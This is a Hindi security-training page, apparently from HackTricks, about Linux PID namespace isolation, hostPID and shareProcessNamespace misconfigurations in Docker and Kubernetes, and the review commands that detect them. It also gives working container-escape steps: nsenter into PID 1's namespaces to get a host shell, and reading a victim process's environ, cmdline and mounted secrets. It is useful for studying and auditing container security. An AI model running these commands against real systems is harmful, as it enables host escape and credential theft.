# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## अवलोकन

PID namespace नियंत्रित करता है कि processes को नंबर कैसे दिए जाते हैं और कौन-से processes दिखाई देते हैं। इसी वजह से किसी container में अपना PID 1 हो सकता है, जबकि वह असली machine नहीं होता। namespace के अंदर workload को एक स्थानीय process tree दिखाई देता है। namespace के बाहर host को वास्तविक host PIDs और पूरा process landscape दिखाई देता है।<sup>[[3]](#references)</sup>

सुरक्षा के नज़रिये से PID namespace महत्वपूर्ण है, क्योंकि processes की visibility मूल्यवान होती है। जब कोई workload host processes देख सकता है, तो वह service names, command-line arguments, process arguments में दिए गए secrets, `/proc` के ज़रिये environment से मिली state और namespace में प्रवेश के संभावित targets देख सकता है। अगर वह इन processes को देखने से आगे बढ़कर, उदाहरण के लिए सही परिस्थितियों में signals भेज सकता है या ptrace का इस्तेमाल कर सकता है, तो समस्या कहीं अधिक गंभीर हो जाती है।

## संचालन

एक नया PID namespace अपनी आंतरिक process numbering के साथ शुरू होता है। इसके अंदर बनाया गया पहला process, namespace के नज़रिये से PID 1 बन जाता है। इसका अर्थ यह भी है कि orphaned children और signal behavior के लिए उसे init जैसी विशेष semantics मिलती हैं। इससे containers में init processes, zombie reaping और कभी-कभी छोटे init wrappers इस्तेमाल करने की वजह समझ आती है।<sup>[[3]](#references)</sup>

PID namespaces एक hierarchy बनाते हैं। किसी ancestor namespace का process, descendants को उस ancestor में दिए गए PID से संबोधित कर सकता है, लेकिन descendant सामान्य PID-based syscalls के ज़रिये ancestor-only tasks को संबोधित नहीं कर सकता और न ही `setns()` से ऊपर जाकर ancestor PID namespace में प्रवेश कर सकता है। हालांकि, descendant के सामने जानबूझकर expose किया गया ancestor-owned procfs, ancestor का process view leak कर सकता है। साथ ही, `setns()` से किसी PID namespace में प्रवेश करने पर namespace **आगे बनाए जाने वाले children** के लिए बदलता है, caller के लिए नहीं; इसलिए tools प्रवेश के बाद fork करते हैं। procfs mount उस process का PID view बनाए रखता है जिसने उसे mount किया था। इसी वजह से `unshare(CLONE_NEWPID)` के बाद नया procfs बनाना सुरक्षा के लिहाज़ से महत्वपूर्ण है, केवल दिखावे के लिए नहीं।<sup>[[3]](#references)</sup>

सुरक्षा की अहम सीख यह है कि कोई process केवल इसलिए isolated दिख सकता है क्योंकि उसे अपना PID tree ही दिखाई देता है, लेकिन इस isolation को जानबूझकर हटाया जा सकता है। Docker में इसके लिए `--pid=host` उपलब्ध है, जबकि Kubernetes में `hostPID: true` का इस्तेमाल होता है। Container के host PID namespace में प्रवेश करते ही workload को host processes सीधे दिखाई देते हैं और बाद के कई attack paths कहीं अधिक व्यावहारिक हो जाते हैं।

## लैब

PID namespace को मैन्युअल रूप से बनाने के लिए:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

अब shell को processes का एक private view दिखाई देता है। `--mount-proc` flag महत्वपूर्ण है, क्योंकि यह नए PID namespace से मेल खाने वाला procfs instance mount करता है, जिससे अंदर से process list सुसंगत रहती है।<sup>[[3]](#references)</sup>

कंटेनर के व्यवहार की तुलना करने के लिए:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

यह अंतर तुरंत समझ में आ जाता है, इसलिए यह पाठकों के लिए एक अच्छा पहला lab है।

## Runtime Usage

Docker, Podman, containerd और CRI-O में सामान्य containers को अपना PID namespace मिलता है। Kubernetes containers में आम तौर पर अलग-अलग PID views होते हैं; `shareProcessNamespace: true` जानबूझकर पूरे Pod के लिए एक साझा view बनाता है।<sup>[[4]](#references)</sup> इसके विपरीत, `hostPID: true` node का PID namespace चुनता है। LXC/Incus environments भी इसी kernel primitive पर निर्भर करते हैं, हालांकि system-container के उपयोग में अधिक जटिल process trees दिख सकते हैं और debugging के लिए आसान रास्ते अपनाने को बढ़ावा मिल सकता है।

हर जगह यही नियम लागू होता है: यदि runtime ने PID namespace को isolate नहीं करने का विकल्प चुना है, तो यह container boundary को जानबूझकर कमजोर करना है।

## Misconfigurations

सबसे आम misconfiguration host PID sharing है। टीमें अक्सर debugging, monitoring या service-management की सुविधा के लिए इसे सही ठहराती हैं, लेकिन इसे हमेशा एक महत्वपूर्ण security exception मानना चाहिए। भले ही container के पास host processes पर तुरंत write करने का कोई तरीका न हो, केवल उनकी दृश्यता से ही system के बारे में बहुत कुछ पता चल सकता है। `CAP_SYS_PTRACE` जैसी capabilities या procfs तक उपयोगी access मिलने पर जोखिम काफी बढ़ जाता है।

एक और गलती यह मान लेना है कि चूंकि workload डिफ़ॉल्ट रूप से host processes को kill या ptrace नहीं कर सकता, इसलिए host PID sharing हानिरहित है। यह निष्कर्ष enumeration के महत्व, namespace-entry targets की उपलब्धता और अन्य कमजोर controls के साथ PID visibility के मेल को नज़रअंदाज़ करता है।

### Kubernetes Pod-wide process sharing

`shareProcessNamespace: true`, `hostPID` से अलग है: यह node processes के बजाय **उसी Pod के अन्य containers के processes** को दिखाता है। इसके बाद compromised sidecar या debug container, procfs access checks के अधीन, sibling containers की command lines और environment data enumerate कर सकता है, credentials अनुमति दें तो signals भेज सकता है, और `/proc/<pid>/root` के ज़रिए sibling के filesystem में जा सकता है। Kubernetes स्पष्ट रूप से चेतावनी देता है कि ऐसी स्थिति में command-line/environment secrets और container filesystems की सुरक्षा केवल लागू Unix permissions पर निर्भर करती है।<sup>[[4]](#references)</sup>

Cluster-side review के लिए उपयोगी जाँच:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Pod-wide PID namespace में compromised container से, visibility का मतलब readability मानने के बजाय पहले वास्तविक access जाँचें:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### मौजूदा Kubernetes Pod में लक्षित ephemeral containers

`pods/ephemeralcontainers` को संशोधित करने की अनुमति वाली Kubernetes पहचान, `shareProcessNamespace` सेट न होने पर भी, चल रहे Pod में debugger जोड़ सकती है। `--target` के साथ, यदि runtime namespace targeting का समर्थन करता है, तो debugger नामित container के process namespace में शामिल हो जाता है। इससे उस container की processes देखने की सुविधा मिलती है, node के host PID namespace की नहीं।<sup>[[5]](#references)</sup>

API एक अलग subresource का उपयोग करती है, इसलिए सामान्य Pod write permissions को पर्याप्त मानने के बजाय इसके `patch`/`update` अधिकारों की समीक्षा करें।<sup>[[6]](#references)</sup>

किसी अधिकृत namespace में Pod और container के लिए, लक्षित view की जाँच करें:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

यदि runtime targeting लागू नहीं करता, तो debugger शुरू होने में विफल हो सकता है या isolated PID namespace में रह सकता है।<sup>[[5]](#references)</sup> यदि targeting काम करती है, तो `/proc/<pid>` तक पहुँच की जाँच करने के लिए [Kubernetes Pod-wide process sharing](#kubernetes-pod-wide-process-sharing) के अंतर्गत दिए गए परीक्षणों का उपयोग करें। दिखाई देना, target के secrets पढ़ने या उसे signal भेजने की अनुमति नहीं देता: Unix credentials और procfs access checks फिर भी लागू होते हैं।<sup>[[4]](#references)[[8]](#references)</sup> Pod Security Standards ephemeral containers की privileged settings पर भी सीमाएँ लगाते हैं।<sup>[[7]](#references)</sup>

## दुरुपयोग

यदि host PID namespace साझा किया गया है, तो attacker host processes का निरीक्षण कर सकता है, process arguments हासिल कर सकता है, दिलचस्प services की पहचान कर सकता है, `nsenter` के लिए संभावित PIDs ढूँढ़ सकता है, या host अथवा आस-पास के workloads में हस्तक्षेप करने के लिए process visibility को ptrace-संबंधित privilege के साथ जोड़ सकता है। कुछ मामलों में, बस सही लंबे समय से चल रही process दिखाई देना ही बाकी attack plan को नया रूप देने के लिए पर्याप्त होता है।

पहला व्यावहारिक कदम हमेशा यह पुष्टि करना है कि host processes वास्तव में दिखाई दे रही हैं:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

जब host PIDs दिखाई देने लगते हैं, तो process arguments और namespace-entry targets अक्सर जानकारी के सबसे उपयोगी स्रोत बन जाते हैं:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

यदि `nsenter` उपलब्ध है और पर्याप्त विशेषाधिकार हैं, तो जाँचें कि क्या किसी दिखाई देने वाली host process का उपयोग namespace bridge के रूप में किया जा सकता है:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

प्रवेश अवरुद्ध होने पर भी, host PID साझा होने से सेवा का लेआउट, runtime components और आगे निशाना बनाने के लिए संभावित privileged processes का पता चलना पहले से ही उपयोगी है। केवल PID दिखने से signal भेजने, trace करने, संवेदनशील `/proc/<pid>` entries पढ़ने या target के अन्य namespaces में शामिल होने की अनुमति **नहीं** मिलती; credentials, target namespace के owning user namespace में capabilities, Yama/LSM policy और seccomp अब भी मायने रखते हैं।<sup>[[3]](#references)</sup> Process-injection के उदाहरणों के लिए [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) देखें।

Host PID दिखने से file-descriptor का दुरुपयोग भी अधिक व्यावहारिक हो जाता है। यदि किसी privileged host process या पड़ोसी workload ने कोई संवेदनशील file या socket खुला रखा है, तो attacker `/proc/<pid>/fd/` की जाँच कर सकता है और ptrace-जैसी checks, ownership, procfs mount options, object type और target service model के आधार पर underlying object तक पहुँच सकता है। केवल FD symlink दिखने का अर्थ यह नहीं कि उसे खोला जा सकता है, और किसी socket को उसके `/proc/<pid>/fd/N` symlink को खोलकर duplicate नहीं किया जा सकता। अलग `pidfd_getfd()` primitive और उसकी authorization checks के लिए [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md) देखें।<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

ये commands यह पता लगाने में उपयोगी हैं कि `hidepid=1` या `hidepid=2` दूसरे processes की visibility घटा रहे हैं या नहीं, और खुले secret files, logs या Unix sockets जैसे स्पष्ट रूप से दिलचस्प descriptors दिखाई भी दे रहे हैं या नहीं।

### Full Example: host PID + `nsenter`

Host PID sharing से host escape संभव हो सकता है, अगर process के पास host namespaces में शामिल होने और host process का root अपनाने के लिए आवश्यक capabilities हों। बाद वाले काम के लिए `nsenter --root` (`-r`) ज़रूरी है: केवल mount namespace बदलने से caller की root directory नहीं बदलती।<sup>[[9]](#references)</sup> `/proc/1/root` को access करने पर ptrace read check लागू होता है, जबकि root बदलने के लिए caller के user namespace में `CAP_SYS_CHROOT` आवश्यक है।<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

यदि command सफल होता है, तो नया shell host के mount, UTS, network, IPC और PID namespaces तथा PID 1 के root filesystem का उपयोग करता है। यह मानने के बजाय कि केवल PID visibility मिलने से host privileges भी मिल गए हैं, effective identity और access की जाँच करें।<sup>[[9]](#references)</sup>

भले ही `nsenter` मौजूद न हो, host filesystem mounted होने पर host binary के ज़रिए भी यही परिणाम हासिल किया जा सकता है:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### हालिया Runtime Notes

कुछ PID-namespace-संबंधी हमले पारंपरिक `hostPID: true` misconfigurations नहीं होते, बल्कि container setup के दौरान procfs protections लागू करने के तरीके से जुड़े runtime implementation bugs होते हैं।

#### `maskedPaths` से host procfs तक race

कमज़ोर `runc` versions में, container image या `runc exec` workload को नियंत्रित कर सकने वाले attackers, container-side `/dev/null` को `/proc/sys/kernel/core_pattern` जैसे संवेदनशील procfs path के symlink से बदलकर masking phase में race कर सकते थे। Race सफल होने पर, masked-path bind mount गलत target पर लग सकता था और नए container को host-global procfs knobs expose कर सकता था।<sup>[[1]](#references)</sup>

उपयोगी review command:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

यह महत्वपूर्ण है क्योंकि अंततः इसका प्रभाव सीधे procfs के exposure जैसा हो सकता है: writable `core_pattern` या `sysrq-trigger`, जिसके बाद host पर code execution या denial of service हो सकता है। समर्पित [masked paths](../masked-paths.md) और [sensitive host mounts](../../sensitive-host-mounts.md) पेज यहाँ दोहराव किए बिना सामान्य procfs attack surface को कवर करते हैं।

#### `insject` के साथ Namespace injection

`insject` जैसे Namespace injection टूल दिखाते हैं कि PID-namespace के साथ इंटरैक्शन के लिए process creation से पहले target namespace में प्रवेश करना हमेशा ज़रूरी नहीं होता। एक helper बाद में attach कर सकता है, `setns()` का उपयोग कर सकता है, और target PID space में visibility बनाए रखते हुए execute कर सकता है:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

इस तरह की technique मुख्य रूप से advanced debugging, offensive tooling और post-exploitation workflows में काम आती है, जहाँ runtime द्वारा workload को initialize कर लेने के बाद namespace context को जोड़ना ज़रूरी होता है।

### FD Abuse से जुड़े पैटर्न

जब host PIDs दिखाई देते हों, तो दो पैटर्न का विशेष उल्लेख करना ज़रूरी है। पहला, कोई privileged process `execve()` के दौरान एक sensitive file descriptor खुला रख सकता है, क्योंकि उसे `O_CLOEXEC` के रूप में mark नहीं किया गया था। दूसरा, services `SCM_RIGHTS` के ज़रिए Unix sockets पर file descriptors भेज सकती हैं। दोनों ही मामलों में, अब दिलचस्प object pathname नहीं, बल्कि पहले से खुला handle है, जिसे कोई lower-privilege process inherit कर सकता है या प्राप्त कर सकता है।

Container पर काम करते समय यह इसलिए मायने रखता है क्योंकि handle `docker.sock`, किसी privileged log, host की secret file या किसी अन्य high-value object की ओर इंगित कर सकता है, भले ही container filesystem से उस path तक सीधे पहुँचना संभव न हो।

## जांच

इन commands का उद्देश्य यह पता लगाना है कि process का PID view private है या वह पहले से कहीं व्यापक process landscape को enumerate कर सकता है।

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

यहाँ क्या दिलचस्प है:<sup>[[3]](#references)</sup>

- अगर process list में स्पष्ट रूप से host services दिखती हैं, तो संभवतः host PID sharing पहले से प्रभावी है।
- केवल छोटा-सा container-local tree दिखना सामान्य स्थिति है; `systemd`, `dockerd` या असंबंधित daemons दिखना सामान्य नहीं है।
- `NSpid` nested namespaces के बीच PID mapping दिखा सकता है। सबसे बाईं ओर का मान procfs mount से जुड़े PID namespace के सापेक्ष होता है, जिसके बाद क्रमशः nested namespaces के मान आते हैं।
- केवल `readlink /proc/self/ns/pid` से `hostPID` साबित नहीं किया जा सकता: isolated container में भी एक मान्य PID-namespace inode होता है। इसे process list, procfs mount, runtime configuration और उपलब्ध होने पर host-side namespace inode से मिलाकर देखें।
- Host PIDs दिखने लगें, तो केवल पढ़ने योग्य process information भी reconnaissance के लिए उपयोगी हो जाती है।

अगर आपको host PID sharing के साथ चल रहा कोई container मिले, तो इसे केवल दिखावटी अंतर न समझें। इससे workload क्या देख सकता है और संभावित रूप से किसे प्रभावित कर सकता है, उसमें बड़ा बदलाव आता है।





## References

- [1] [runc सुरक्षा सलाह: mount race conditions के कारण "masked path" के दुरुपयोग से container escape (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 पुस्तक](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Pod में Containers के बीच Process Namespace साझा करें](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [चल रहे Pods को Debug करें](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [Ephemeral Containers KEP](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
